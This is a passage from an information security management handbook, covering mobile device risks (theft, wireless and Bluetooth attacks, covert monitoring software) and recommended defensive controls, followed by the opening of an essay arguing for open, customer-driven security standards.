to simple devices such as USB memory sticks and external hard drives.
In general, several risks have been identified with mobile devices. Not surpris-
ingly, not all risks are applicable to each device and even less surprising is that many 
of these risks exist with larger desktop computers that typically have more process-
ing power, more storage, and higher bandwidth. What is not surprising is that these 
risks are manifested due to lack of physical and logical controls that we can apply 
to those desktops. There is no guard or card key access to get to the laptop you 
thought you had left at your feet a few minutes ago. There is no corporate firewall 
or intrusion prevention system to protect your laptop while you are accessing your 
e-mail using free wireless Internet access at the coffee shop. One of the themes of 
this chapter is to extend those controls to the mobile devices or to offer compen-
sating controls that offer different controls and safeguards that reduce the risk in 
a different but perhaps more practical manner. Figure 4.1 highlights some of the 
controls that we’ll discuss along with the attack vectors that they mitigate.
One of the most prevalent risks to mobile devices is the loss or theft of the 
device itself. Many years ago I left a phone charging cable in a very large hotel I was 
staying at and when I returned for my next stay, I stopped by the lost and found 
office to retrieve my cable. I was invited to look through several boxes of cables, 

Mobile Data Security  ◾  47
where I ultimately found mine or at least one that looked like mine, as there were 
several. Although I was surprised at the number of charging and synchronization 
cables that were left in the hotel, I cannot believe to this day the shelves that were 
filled with laptops, mobile phones, smart phones, and Blackberry devices. Many 
times magazines and newspapers run stories about the lost and found departments 
at airports and the strange things that they contain. I’m forever amazed that people 
don’t track their equipment down before it is sold for a small percentage of its true 
hardware value and before the new owner discovers the value of the software and 
data on the device.
Theft of mobile devices in public areas such as restaurants, airports, and other 
high-traffic areas continues to grow and pose a tremendous threat. Consider the case 
of the CEO of a large wireless and microelectronics manufacturer who had his lap-
top stolen moments after wrapping up a presentation to journalists. Was the laptop 
stolen for the hardware value, or for the sensitive data that a CEO’s laptop was likely 
to contain that would be invaluable to competitors and potential customers who 
now had all of the pricing and design details that they may ever need? Although 
that is just one of many high-profile cases that have been in the media, thousands of 
other cases illustrate that laptop and mobile device theft affects everybody.
Consider a device that isn’t even stolen. A large-capacity memory stick filled to 
capacity can be copied in a few minutes. A hard drive can be removed from a com-
puter and copied in a forensically sound manner that doesn’t affect the system at 
all and, if left in suspend mode, would resume right where it had been suspended, 
and the owner would be none the wiser. There are many stories, likely some fact 
and some folklore, of business deals gone awry because somebody entered the hotel 
room of an executive and picked the safe to make a copy of the hard drive secured 
in that safe. Many mobile devices do not authenticate themselves or the system 
Mobile
Spam
Loss
Eaves-
dropping
Connection
Attack
Software
Remote
Mngt &
Control
VPN or
Tunnel
Anti-
SMS
Spam
Anti-
Brute
Force
Device
FW
Device
AV
Conﬁg
Mngt
Encrypt
Auth
Attack
Vector
Controls and Safeguards
Figure 4.1  Controls versus attack vectors.

48  ◾  Information Security Management Handbook
when synchronizing with a computer system, and it is often a matter of plugging 
the right cable into a device to be able to copy all the data from the device.
Wireless security continues to increase the risk of mobile devices. With devices 
moving from slower cellular transmission speeds to faster 3G speeds, data can be 
transmitted and received at high speeds. Many devices have very primitive, if any, 
firewalls or other controls built in to protect the device against attacks and threats 
from the service provider network. Many, but not all service providers restrict 
access from one device to another on their high-speed data networks and generally 
restrict traffic to travel between each device and some external endpoint. Do you 
know how the security has been configured within the service providers that you or 
your organization will be using?
Wireless risks also exist in the Wi-Fi spectrum. 802.11b continues to be the most 
popular, with other variants closely behind. Most of the modern mobile devices 
contain built-in wireless connectivity, which in some cases is configured to be on 
by default. Our devices, when enabled to transmit data over Wi-Fi, are susceptible 
to eavesdropping if the data is not encrypted, are susceptible to man-in-the-middle 
attacks with rogue access points that disable and then masquerade as the legitimate 
access point, and are susceptible to other malicious attacks that are possible when 
using a potentially untrusted connection medium.
A continued threat that has existed for quite a while as well is through an 
improperly configured Bluetooth radio component in a mobile device such as a 
smart phone. Bluetooth attacks have evolved to develop their own vocabulary 
including bluesnarfing, bluejacking, and bluebugging. Bluesnarfing involves a 
malicious individual gaining covert access to the device through a Bluetooth con-
nection to transfer data such as calendar appointments or contacts from the device. 
Bluebugging is covertly issuing commands to the device to attempt eavesdropping 
or even to cause the device to dial a premium-rate telephone number and incur 
frighteningly high charges. Finally, bluejacking is an attack in which somebody 
sends an unsolicited short message service (SMS) or multimedia message service 
(MMS) message to an unwilling recipient in the form of a business card exchange 
that may contain an offensive message, perhaps an offensive image, or the link to 
download some Trojan from a Website.
Going the way of the floppy drive, the infrared (IR) port on laptops and some 
older PDAs to facilitate printing and to synchronize data could pose a threat if it is 
misconfigured. In the unlikely event that a device still has an IR port, it should be 
disabled through an IT policy pushed down to a device in the operating system or sys-
tem BIOS when not in use. Many firms provide a far more simple solution of applying 
a small piece of electrical tape over the IR sensor to prevent any data transmission.
Another risk stems from software that a malicious user is successful in loading 
into a mobile device. Whether it is in the form of a Trojan buried in a legitimate 
application, visiting a URL that results in the installation of the application, or 
causing the installation of the application on the host computer that is synchro-
nized with a mobile device, once attackers can get software of their choice installed 

Mobile Data Security  ◾  49
on a system, the system is generally considered to be compromised. Remember 
applications such as “Back Orifice” and “Sub7,” whose sole purpose was to provide 
a covert remote computer system control tool that the malicious user could use to 
have the target system execute any command or perform any function? Those and 
more advanced applications exist today.
Software threats exist in the PDA and Blackberry world as well. In 2006, Jesse 
D’Aguano demonstrated his proof-of-concept application called BBProxy that 
could be utilized to gain access to back-end system servers protected by an organi-
zation’s firewalls through the use of a compromised Blackberry device. This tool, 
in conjunction with code executed on a Blackberry device, would provide access to 
the back-end systems and would also serve as a launch platform to identify other 
weaknesses and vulnerabilities within the corporate perimeter.
And finally, software threats exist with smart phones as well. The industry has 
seen some well-written proof-of-concept works and virus-like applications that 
propagate through Bluetooth or the calendaring program to infect other machines 
before very professionally deleting and wiping all data off of the device. Recently, 
a few companies have begun to offer complete monitoring software to track usage, 
location with GPS-enabled phones, SMS, and phone call logs, and some of the 
deluxe software solutions record and then send the entire conversation back to a pre-
defined e-mail address. Originally intended to identify cheating spouses and help 
protect children, the software could be installed surreptitiously on any compatible 
device without your knowledge as one of the program’s strengths is typically its 
covert installation and operational capabilities.
One of the biggest threats to a firm’s infrastructure is the introduction of unau-
thorized mobile devices that are typically only controlled via policy and aware-
ness. Usually with the best and most honest of intentions, corporate associates may 
decide to utilize their own larger USB memory drive, their faster laptop, or their 
smart phone that works in the country that they will be visiting. With organiza-
tions moving toward utilizing encrypted USB memory drives; laptops with anti-
virus (AV), strong authentication, and encryption; and mobile devices that require 
authentication and encrypt all data on the device including memory cards, well-
intentioned individuals would cause more harm than good in utilizing their own 
equipment and not that of their firms.
Complexity is often another contributing factor to the increase in risk of mobile 
devices. Multiply the number of permitted devices in the environment with the 
number of different configurations and parameters and the combinations are virtu-
ally unlimited. In addition, there is a certain element of uncertainty or mystery in 
how communications work. Take, for example, the security of a Blackberry device. 
Although the communications channels are well documented and have been 
assessed by independent third parties, a shroud of mystery surrounds the Research 
In Motion Network Operations Center (NOC) in Ottawa, Canada. If you refer 
to Figure 4.2, it is evident that all e-mail communications to or from a Blackberry 

50  ◾  Information Security Management Handbook
device travels through the NOC, but there is adequate protection through the use 
of Triple DES or AES encryption to protect the message from eavesdropping.
4.4  Controls and Safeguards
A number of controls and safeguards can be implemented that reduce and some-
times completely mitigate many of the risks that have been discussed. Unfortunately, 
many of the controls that are built into the operating system or device itself are 
sacrificed in the name of ease of use and by request of executives who may not 
be sold on the need for the security controls or who place convenience ahead of 
security. Additionally, many individuals and small businesses lack the dedicated 
IT resources to administer and maintain the security features that are generally 
enabled just a few hours after the first time a smart phone or laptop is stolen or lost. 
Consider a small firm planning an IPO or focused on its first big product launch. 
Interested in enabling FileVault on their Mac OS X? Probably not. Concerned with 
turning the system firewall back on after disabling it to conduct the testing? Again, 
re-enabling the security features is unlikely to happen unless a timed feature auto-
matically re-enables the firewall.
We’ve already discussed the development of a complete asset inventory of all 
mobile devices including PDAs, smart phones, and laptops. We’ve discussed the 
development of a data classification guide that provides a comprehensive and easy 
methodology for associates to categorize the data that they create or access, and 
we’ve reviewed the importance of an accurate data inventory program. Finally, 
we’ve discussed how a data retention program can ultimately reduce the amount of 
information that you are protecting as it is archived or redacted on a regular basis.
One of the best solutions to addressing the risks imposed by mobile devices is 
not a single control, but rather a collection of controls that form a defense-in-depth 
Research In Motion
(RIM) Network
Corporate
Intranet
Service Provider Network
Figure 4.2  Typical Blackberry infrastructure.

Mobile Data Security  ◾  51
approach that incrementally increases security with each control and doesn’t fail 
completely in the absence of one control. Recall my stolen laptop with a strong 
physical deterrent of the cable lock and the BIOS password-based authentication. 
The cable lock was insufficient in protecting the device, but the BIOS password was 
the control that enabled its recovery. Having employed a third layer that included 
whole disk encryption would have sufficiently reduced the risk to the point of only 
wanting the laptop back to reformat, reconfigure, and then redeploy.
It is ironic that many firms in the past would deploy a laptop valued at several 
thousand dollars for the hardware, add licensed applications that may cost several 
thousand as well, and then not provide a cable lock for the device. Fortunately, 
many IT organizations today are beginning to deploy cable locks along with the 
laptops. For those that don’t, it is recommended that the business units procure 
them for the associates. If you are protecting your own laptop, a $50 cable pur-
chased at an office-supply or computer store will typically be sufficient and would 
be considered a worthy investment.
A software-based solution to recover laptops when the physical controls of lock-
ing the device fail comes from the growing sector of “call-home” type software. 
Whether it is a commercially available and centrally monitored solution that hides 
on a mobile device such as a laptop or smart phone, the software will contact a pre-
defined system with information about the IP address that it currently has, perhaps 
some usage information, and on some devices with built-in cameras perhaps even 
send a picture back. Although this wouldn’t be the first line of defense, publicly 
available anecdotes and news articles indicate that a modest investment up front to 
install and run the software on the system covertly may pay benefits if the device 
is stolen.
Training and awareness are important aspects of any information security pro-
gram and the training aspects should include regular reminders of the mobile data 
security areas of the policy. The program should address the storage and transporta-
tion of mobile devices such as locking up a laptop in a car trunk or hotel safe when 
not in use, and should address logical security issues such as the installation of 
unauthorized software, the use of unauthorized devices, and the importance of not 
making changes to system and device configurations. Many other key areas of the 
firm’s policy should also be part of the training and awareness program including 
defining personal liability in the event that associates are negligent in protecting 
the assets or intentionally defeat controls. Many companies today hold employees 
accountable for the replacement costs of laptops and devices when they are not 
secured and protected in accordance with the company policy.
A number of solutions address the typical confidentiality, integrity, and availabil-
ity components of an information security policy. In addition, we’ll also briefly discuss 
auditing as an additional control to support any investigative needs and accountability 
of users and their actions, both of which are notoriously weak in almost all PDAs.
Many of the following recommended controls and safeguards are those that 
are documented in the policy and those that we hope that our users follow. For 

52  ◾  Information Security Management Handbook
many devices, whether an Apple Macintosh, a Microsoft Windows, a Microsoft 
Windows Mobile, or a Blackberry, many of the controls recommended in this sec-
tion are available to be pushed down to the device in the form of IT policies. It is 
highly recommended to push the controls down to the user in the form of nonuser-
changeable local policies and not to rely on the end users to comply with corporate 
policies based on their recollection and will to comply.
The recommended solution is to identify all of the configuration options of the 
devices and the supporting infrastructure (such as Blackberry Enterprise Server, 
or BES) and then map those configurations and parameters to the existing cor-
porate policy so that the implementation mirrors the corporate policy. These con-
trols should be implemented prior to deployment to secure all devices as they are 
deployed and to help mitigate the necessity to “sell” the additional security, which 
will be seen as an unwelcome burden to the users when implemented post-deploy-
ment. How many times have you heard an administrator wish that he or she had 
deployed a control that was stronger or more secure at deployment time and now 
had to go through the return on investment, impact analysis, training and aware-
ness programs, and more, just to increase the length of a password on a mobile 
device from six to eight characters?
The corporate policy should also address whether personal assets can be uti-
lized to access or store corporate data. If an organization provides the associates 
with a password protected and encrypted USB memory drive, there should be a 
policy that prohibits the use of a personally owned USB memory drive. The use of 
personal PDAs, laptops, and computers at home should be addressed and not left 
ambiguous so that associates know exactly what is allowed and what is restricted. 
The mobile device policy should address the entire life cycle of the device from 
initial configuration and setup to deployment and ultimately to decommissioning 
the device and preparing for the next user.
One of the easiest ways to protect the confidentiality and integrity of the data 
stored on any mobile device is to require some type of authentication to access the 
device. For laptops, users typically log in with their username and password pair 
to gain access. For handheld devices, users are usually prompted simply to enter a 
password, which is typically called a “pin” because it may be as short as four char-
acters and may not require any specific complexity or special characters. Although 
some devices initiate a memory wiping of all data after an incorrect password is 
entered more than some predefined number of times, some simply increase the 
delay between password entries to slow down an attacker attempting to guess a 
valid pin or password.
One typical recommendation is to mirror the existing corporate policy (if it 
exists) or to utilize an industry best practice of a six- to eight-character password 
with some form of complexity, and an account lock-out or wipe after some number 
of incorrect attempts. Although a laptop may allow two or three sets of five pass-
word attempts with a 15-minute time-out between sets, that type of complexity 
may not be possible with a Blackberry or Microsoft Windows Mobile device and 

Mobile Data Security  ◾  53
the device may automatically purge all of its content after some number of invalid 
attempts. I typically see many organizations utilizing the default setting of eight 
invalid attempts on a Microsoft Windows Mobile device or ten invalid attempts on 
a Blackberry before automatically purging the memory.
Another important aspect of protecting the data’s confidentiality and integrity is 
to encrypt the data stored on the device as well as any add-on memory cards. These 
devices typically utilize the password or pin entered to log on or access the device as 
the decryption key and typically offer strong encryption in the form of Triple DES, 
AES, or elliptic curve cryptography (ECC) to protect the data. A strong authentica-
tion requirement paired with a strong encryption algorithm is a great way to protect 
data stored on a USB memory device, many of which “enterprise class” devices have 
built in and run automatically when inserted into a laptop.
To protect the mobile device, especially when connected to a noncorporate net-
work such as a service provider’s 3G network or the Wi-Fi at a local coffee shop, a 
firewall and an automatically updating AV solution should be installed. The fire-
wall should be configured to block unsolicited incoming traffic, and an optimal 
solution would transmit unsuccessful attempts and other pertinent events from the 
AV solution to a central location for monitoring and analysis. Equally important 
to protect the confidentiality and integrity of the data in transit to connect to the 
corporate network is the utilization of a virtual private network (VPN), which 
encrypts all traffic to the corporate network. It is important to note, however, that 
all traffic may not be protected. Some firms configure their client VPN to route 
all corporate traffic over the encrypted VPN tunnel while routing the noncorpo-
rate traffic such as banking information or personal e-mail over the unprotected 
Internet. Consumer-based solutions exist today to route unprotected traffic to a 
central location that decrypts the traffic and then sends the data along through 
the Internet. For either a one-time or monthly fee, these services protect data as it 
travels over a wireless (or wired) unsecured network such as a coffee shop or public 
Wi-Fi facility, but then send the data over the Internet.
4.5  Assessing and Auditing
One of the most important security aspects to consider is the inclusion of the 
mobile device infrastructure into the security assessment or audit schedule to iden-
tify vulnerabilities regularly and to develop plans to mitigate the identified risks. 
Additionally, the introduction or change of a mobile device infrastructure should 
trigger an assessment that includes the mobile device infrastructure.
Many vendors today produce excellent documentation highlighting the secu-
rity features and configuration options of their devices. Industry standards such 
as ISO/IEC 27002 and those from the payment card industry provide some valu-
able guidance that can be applied to mobile devices. The U.S. National Institute 
of Standards and Technology also provides some guidance and recommendations 

54  ◾  Information Security Management Handbook
that can be applied to bolster a firm’s mobile device security program. In addition, 
the firm’s corporate policy probably provides significant guidance for other devices 
that can be extrapolated and incorporated to develop a mobile device policy. These 
can serve as baseline documents to identify gaps and weaknesses from the audit and 
assessments that will be conducted.
Assessing the infrastructure will likely require a review of messaging serv-
ers, content servers, firewalls, authentication servers, and other devices that are 
integrated with and utilized by the mobile device infrastructure. They should be 
included in the regular assessment program if they are not already.
Any assessment should include a review of the policy infrastructure includ-
ing policies, practices, standards, and guidelines, and should validate that they are 
being followed. The review should include the life cycle management of devices 
from how they are ordered to how they are shipped to a recycling firm (which had 
better include wiping of the data). The review should also be technical in nature 
and may include the use of tools such as packet sniffers to validate a vendor’s claim 
of encryption or authentication and should test the effectiveness of important tools 
such as remote wiping in the event of an employee termination or loss of a device.
4.6  Conclusions
A few years ago an associate who left a large global financial institution sold his 
Blackberry on eBay. As an employee of the company, he had to buy his own device, 
so it was his, but it was maintained by the firm and configured to send and receive 
e-mail and to synchronize his corporate calendar, contacts, and other data. When 
he left the firm, he simply took it with him and decided to sell it on eBay. When 
the purchaser received it for approximately $15, he was surprised to find a treasure 
trove of information regarding upcoming transactions and activities, personal con-
tact information of senior executives, and more. Needless to say, there was a lot 
of information on that device that could have been wiped remotely with a single 
command if the employee separation process and device decommissioning process 
had been integrated.
Laptops with sensitive data such as Social Security numbers, health informa-
tion, and other personal information continue to be lost, stolen, and compromised. 
Without appropriate controls in place, companies wind up spending hundreds of 
thousands and many times tens of millions of dollars in notification and providing 
credit monitoring services to the affected customers. Ironically, the first thing that 
is done after the data breach is the implementation of the very controls that may 
have prevented it in the first place, so the money that could have been spent up 
front is spent after the breach. The only difference is the tens of millions of dollars 
in notification and monitoring costs, the regulatory fines, the unwanted publicity, 
and sometimes the opportunity for a few people to find another career.

Mobile Data Security  ◾  55
Many times the controls that could have prevented the breach could have been 
implemented with minimal effort. Whether it is user resistance to those controls, a 
lack of funding, or a lack of knowledge or awareness on behalf of the end users or 
administrators, the problems are typically solvable utilizing the tools and mecha-
nisms provided by the device vendors. Sometimes it requires a focus on gaining 
buy-in and sponsorship from executive management and sometimes it is simply an 
administrator configuring the device as it mirrors the corporate policy. It may be a 
long and arduous road to securing the infrastructure, but at the end of the day it is 
a road well taken.
By the way, has anybody seen where I left my Blackberry?


57
5
Chapter 
Enhanced Security 
Through Open Standards: 
A Path to a Stronger 
Global Digital Ecosystem
David O’Berry
“We cannot solve our problems with the same thinking we used when 
we created them.”
—Albert Einstein
The hardest part of attempting to write for a book of this caliber is questioning 
whether or not you have enough valid input to make it worth reading. This book 
Contents
5.1	 What Matters?............................................................................................58
5.2	 Why It Matters?..........................................................................................60
5.3	 Standards, Part One: “Revolution Not Evolution”......................................61
5.4	 Standards, Part Deux: Foundations for Visibility........................................63
5.5	 Standards, Triple Play: “Endpoints and Flowpoints and the Threat 
State Database”...........................................................................................65
5.6	 Standards: Why Do They Really Matter Going Forward?...........................67
5.7	 Conclusion..................................................................................................70

58  ◾  Information Security Management Handbook
is about the practical application of security principles and some of the topics con-
tinue to simply blow my mind, by reminding me just how much information is 
out there and how little of it I know. Interestingly enough, this is an empowering 
feeling instead of a disabling one because in some ways it frees my mind to consider 
things that I heretofore have either not seriously considered or have considered and 
dismissed for some reason.
From an Information Technology (IT) security perspective, the real world has 
changed so drastically in the last few years as to make a chapter that describes 
“practical” thought processes with some real implementation considerations valid 
and therefore worth your time. This chapter will not be like many of the chapters in 
this book in that it will ask you questions as well as proceed in a conversational style 
that may be disconcerting for some. Due to size restrictions some concepts may 
simply be touched on while others may be more fully explored. To be clear, none of 
this is groundbreaking, and in reality there are probably very few original concepts 
that I will write about. What I am hoping to do is frame up the current real world 
through a brief synthesis of existing ideas in hopes of encouraging a larger number 
of practitioners of our discipline to move back to some type of significant leadership 
role in this environment. Ultimately, instead of being herded, we can lead and be 
led by things that apply to what we are seeing right now instead of five or ten years 
ago. In order for us to get to that point, we need to understand where we came from 
as well as some of the possible paths we have ahead of us.
5.1  What Matters?
All too often in Information Technology, specifically in security, we get so inun-
dated with the “wheres” and “hows” of something that we tend to lose sight of the 
real “whats” and “whys.” Holistically speaking, the practice of security is one that 
everyone can subscribe to, but the realities of the world we live in is that practical 
application is something very few of us actually want to take on. Having said that, 
the real challenge that IT has had in the past, not specific to security, is a lack of 
customer-based leadership in what is going on at any given time. We have often 
allowed the vendor brain-trusts in one form or another to be the guiding light 
because, let’s face it, in many cases those guys bring a lot of incredibly smart minds 
to the table, have patents, and do wizbang things that amaze us. An unfortunate 
side effect of this is that we oftentimes allow ourselves to be cowed by them. They 
then get us in a situation and run a whole team of “ninja monkey engineers” at us 
that have every reason in the book why their product is far, far better than any other 
product and why we should buy only from them, asking us to barely giving any 
consideration to what else is out there. In many cases this has even contributed to 
the concept of IT for IT’s sake which has then created tension between us and the 
business. What we have to remember is there are no IT projects, there are simply 
business projects with IT components. Yet, in the past, we have forgotten or at 

Integrated Security through Open Standards  ◾  59
least strayed from that tenet which makes us ripe to be divided and conquered by 
vendors that need our dollars to survive.
Now, how often is the product by that single vendor you tested actually the best 
thing out there to solve the problem occurring in your organization? While the 
statistics vary depending on what source you reference, there is no question that far 
more products and companies are actual flops than successes. The reality is, that’s 
how it’s supposed to be really, because if everyone’s idea was the best idea we would 
be left in intellectual gridlock. So what we have is a situation where more failures 
than successes are the true path to progress. The real problem is that instead of see-
ing this, we get this marketing blitz that tries to convince us to buy their product 
because their “ninja monkeys” actually get it right while these other vendors are 
supposedly just confused and bumbling around with no hope of finding salvation. 
Sound familiar?
It should sound familiar, because that is how the industry has worked for many 
years. That’s certainly not a new thing and, especially in the initial phases of com-
puting, was not necessarily a bad thing. However, as the stakes have been raised 
it has increasingly become evident that we’ve got to change our way of thinking.. 
We cannot afford to wait anymore as these companies continue to slug it out to 
control what should be agile rapidly evolving open standards that we require to 
even have a remote chance of stepping away from the edge of the digital abyss 
at which we stand. What do I mean by that? Well, for starters we are in a digital 
ecosystem unlike anything we have experienced at any point in human history. It 
is the concept of the “Circle of Life” but it is happening at warp factor nine and, to 
the chagrin of some, it is driven by users. Yeah, those horrible plankton-like crea-
tures (joking here) are what feed the entire world because they are what matters. 
They are the iPhone Gremlins, Skype Monsters, Gmail Maggots, and Streaming 
Media Punks; those little malware-infested pod people are why we do what we 
do. This new generation of millennial “I GOTTA HAVE” end-users are a critical 
component of the engine that will drive the world economy forward in the next half 
century. Scary, isn’t it? It doesn’t have to be. At every turn we have to remember that 
business functions best based on efficiency, and these people that our industry has 
tended to look upon rather disdainfully at times are the lifeblood of each and every 
organization. That graphic artist that is so special that he has to have his own Mac 
is there for a reason, and it is to pay your salary, because in most cases what we do 
has no directly visible positive impact to the bottom line. That goes directly back to 
the purpose of IT and IT security as enablers for the business and not entities unto 
their own selves. I know what you are thinking and sure, we help the bottom line 
not become a negative, but let’s be realistic: we know how hard that is to explain 
to people.
Why is that? Why does something that matters so much to individuals and 
companies seem so arcane? Why does it sometimes become such a chore to even 
attempt to provide a value proposition for what we do? For starters, it is hard to 
explain something that the world as a whole has taken very little vested interest 

60  ◾  Information Security Management Handbook
in until it is almost too late. As a profession, you know that those of us who have 
been talking about the challenges coming have been in the minority quickly 
drowned out by the folks who tend to point to Y2K as some horrible failure 
because we did our jobs so well that nothing much happened. That may be 
counter-intuitive, but from a practical point of view, it’s often how the real world 
functions. Often these same professionals, as well as some of the vendors we deal 
with, get such tunnel vision that it looks to many of us like they have “Ostrich 
Syndrome” with heads so firmly buried there is no hope of illuminating the way 
to “truth”. It sounds hopeless, but it isn’t. It just takes a different mentality and 
way of thinking that starts with customer-driven standards that move faster than 
the current process. Going forward, it is my contention that standards-based 
interoperability is critical to network security with empowered users actively 
participating in driving those standards rather than passively allowing vendors 
to continue to control the process.
5.2  Why It Matters?
Let’s look at it in a different light for a moment. Do the various branches of the 
United States military usually wait for vendors to come tell them how and what 
they need to fight the next war? No, they do not. Instead they go to the vendors, 
they work together to determine what makes sense, and then put their combined 
knowledge and experience to use accomplishing incredibly important goals. For the 
most part, our industry operates almost completely opposite of that model usually 
driven by vendor’s product cycles. The problem is now it is no longer practical to 
continue down that path. The reason the old way no longer works is that now we 
must contend with threat cycles that spin at a much more rapid pace than current 
product cycles could ever hope to move. A simple graphical representation is below 
in Figure 5.1.
What does that mean? Well, for one thing, by the time a product gets through 
a vendor’s cycle and actually makes it to market, the real world needs of the cus-
tomer have more than likely changed. So while we are waiting through the starts, 
stops, and failures that I reference above as the standard way things progress, we 
are locked in a death-spiral as new problems hit. We all know that the real world 
issues stem from design challenges that often had security in the backseat (at 
best) early in the formative years. So now, the bolt-on thing keeps occurring over 
and over again, and vendors at times sell us bad code to protect worse code. But 
wait; there goes that counter-intuitive thing again. So how do we even begin to 
dig ourselves out of this situation? Well, the first step is to understand the current 
gap between education and innovation in our society. We also must recognize 
that while luminaries from the vendors have generally led in the past, this does 
not have to be the case. In fact, it should not be the case in the majority of areas 
once we solve the education and communication aspect. We need to remember 

Integrated Security through Open Standards  ◾  61
that open standards that evolve fairly rapidly are a critical to this equalization 
of the customer/vendor relationship . They can contribute to a paradigm shift 
as entities of all sizes, from the incredibly large to the very small, are involved 
in a process that has too often been “big vendor and friends” only. I will touch 
on these topics plus some practical thought processes for design concepts in the 
next few pages.
5.3  Standards, Part One: “Revolution Not Evolution”
I have discussed standards and their importance in the generic sense up until this 
point. Now I am going to discuss a couple of scenarios over the next few pages 
along with the how and why, in my opinion, a newer, quicker, more open standards 
process matters from a practical application standpoint.
We are all aware of the rapidly evolving security landscape and in many cases 
it stems from the confluence of vast amounts of computing power coupled with 
faster and faster ways of communicating. This creates some crazy good opportuni-
ties for businesses in all fields to leap forward and to really prosper. All facets of 
the economy have been affected by this “Digital Industrial Revolution.” It shows in 
many positive and also many negative ways. As with any revolution of sorts, there 
is collateral damage in many forms, and right now what we are dealing with is an 
older security posture with very new threats. Increases in bandwidth together with 
the ubiquity of attachment points left many people looking around trying to figure 
Implement
Design
Assess
Treat Cycle
Manage
Monitor
Implement
Design
Assess
Treat Cycle
Manage
Monitor
Implement
Design
Assess
Treat Cycle
Manage
Monitor
Implement
Design
Assess
Treat Cycle
Manage
Monitor
Implement
Design
Assess
Treat Cycle
Manage
Monitor
Implement
Design
Assess
Treat Cycle
Manage
Monitor
Redevelop
Develop
Conceive
18–24 Months
Realize
Use
Product
Lifecycle
Yay! We have a product to
counter a threat that
changed to something that
requires a new
product...wait?
If they miss it can leave you
gasping for air
Modularity not really a
concern leading to long
development lifecycles
Vendor stops and starts
with products per internal
challenges and market
changes
Figure 5.1  Product cycle versus threat cycle: modular frameworks and stan-
dards required going forward.

62  ◾  Information Security Management Handbook
out how exactly to stem the flow of data to areas they were not prepared to protect 
in the early to mid 2000’s. With that in mind, now we have to look at ways of gain-
ing comprehensive distributed visibility across the enterprise while at the same time 
processing more security event related information than people have the stomach 
to deal with at this point.
We all remember the Intrusion Detection System (IDS) scenario where at least 
one major pundit-filled analyst organization called the solution dead before it got 
fully implemented, based on false positives and what they felt was a uselessness of 
after the fact information. Of course, that gave way to the newest marketing phe-
nomenon, Intrusion Prevention Systems (IPS), and while that stays in effect today, 
many vendors initially just took their old IDS systems and called them IPS while 
giving them some blocking capabilities. This is a standard Marketing 101 trick: 
“Why invent when you can rename?” To be fair though, that is not a vendor only 
problem and in many cases IDS (when coupled with the proper configuration and 
education level) did, and still does, serve a purpose in many organizations. The 
challenge was also with organizations finding the people to run the systems or find-
ing the money to educate on it. Both of those are not really vendor problems and so 
fall on organizations that see those types of things as just “line-item security issues” 
that can be cut the same as office supplies.
I grew up in a small individual computer world for the most part, starting back 
with the VIC 20 and Commodore 64, graduating to the Amiga and then the PC. 
When I look back I am always astounded at what we were able to accomplish back 
then on so little real estate versus what we can accomplish now with computers that 
simply dwarf those machines. As we began to connect those IBM PCs, the power of 
data-sharing really began to manifest itself and the world was a happy place. There 
was free flow of information, shared printers, and consolidated points of storage 
that did not cost millions of dollars. Businesses were in heaven and security was 
a real afterthought, because in the world of small disconnected PCs the mentality 
was far different than it had been working from the center out, the way mainframes 
functioned. Today, some organizations are swinging the pendulum back toward 
centralization with the thin client concept but we cannot ignore endpoint security. 
Infected endpoints can capture passwords and confidential data and mount attacks 
on critical systems. We really need trustworthy devices, whether through the use of 
hardware security like the Trusted Platform Module (TPM), software security, or 
more likely a combination of the two.
While the concept of the “centrally distributed” computing model is fairly sim-
ple, what is not simple is the evolution and implementation of the idea. The seem-
ingly contrary concepts of power at the edge and control at the center really make 
for a significant set of challenges. Addressing those things has often been the pur-
view of the vendors and we have at times been forced to take a backseat and watch 
as each successive product has rolled out hoping for our chance to “get it right”. 
The problem again comes back to the product cycle vs. threat cycle issue and it has 
become more and more apparent over the last ten years that the traditional vendor 

Integrated Security through Open Standards  ◾  63
centric model just cannot work without modifications. Enter open source and the 
concepts of development communities and others that now have different motives 
to create products and services. What that has created is a unique opportunity to 
potentially bring in the vendors we are used to dealing with and communities that 
are relatively new to create a workable yet completely untested paradigm shift to 
heterogeneous open interoperability.
5.4  Standards, Part Deux: Foundations for Visibility
Only within the last year or two has there been real hope, in my opinion, for a 
fix to this situation that will not have to be brought on by a catastrophic failure 
that requires government intervention, regulations that will stifle innovation, and 
more fear and paranoia than is healthy for the participants in this global digital 
ecosystem. The old hardened perimeter is passé now with people calling for “de-
perimeterization” or whatever they choose to call it from week to week. “Defense 
in Depth” vs. Mothra … many innocents in danger! So what is the real deal with 
the current state? Well many companies have now recognized that security has to 
permeate what they do in order to have a chance at succeeding.
How permeation occurs is open to interpretation but the real problem comes 
in the fact that over the years very little heed has been paid to the security aspects 
of the frameworks and code that really are the foundation of the current environ-
ment. First and foremost that has to be fixed, and organizations such as the ISC2, 
ISSA, ISACA, SANS are concerning themselves with at least discussing and possi-
bly helping people to understand and hope to follow, test, and certify secure coding 
methodologies that will pay off in years to come. We even see large companies get-
ting into the mix with Google, Microsoft, Sun, IBM, Oracle, and others preaching 
the virtues of writing good secure code while providing guidance within their own 
spheres of influence. The challenge is that in the interim we are not there and until 
we get there we need to bridge the risk gap in order for the digital ecosystem to 
continue to function properly.
To have a shot at really making a dent in the problem, we have to go back to 
standards, interoperability, and the leadership aspects that have been previously 
referenced. At this point organizations like the Trusted Computing Group (TCG) 
have in place various working groups that have responsibilities for many of the most 
at risk areas of computing. The standard frameworks put forth by an organization 
like the TCG in an area like Network Access Control cannot really be overstated 
because the baseline security posture of many organizations is simply not where it 
needs to be. Going back to the ecosystem analogy, each of these organizations that 
are deficient can directly impact even the healthy organizations by becoming jump 
off points for attacks of various kinds. It is not unlike the human immune system 
in that a breach in one area threatens the entire organism. Another way to think 
about this is the “Digital Feudalism” concept and how in many of the older security 

64  ◾  Information Security Management Handbook
models we have each gotten in our castles with our moats while peering out waiting 
for the horde to attack. Unfortunately things have changed drastically and now the 
malware horde is even recruiting people within the castle to work from the inside 
out and we all know that is only takes one internal challenge (the horde recruiting 
one of your own) to make us vulnerable to all sorts of problematic issues
From the design perspective it seems almost impossible to stop the threats 
without becoming restrictive to the point of complete uselessness. Throughout 
my career I have been down both roads (wide open and steel jaw shut) and I will 
tell you that with the new generations of users coming,and understanding what is 
really best for the businesses, there is no way to be closed up completely. One of 
my favorite lines in the movie Jurassic Park is where the scientist alludes to the fact 
that “nature will find a way” and that really holds true intentionally or uninten-
tionally for both users and the people who want to take advantage of those users. 
All is not lost though, because over the past couple of years things in security 
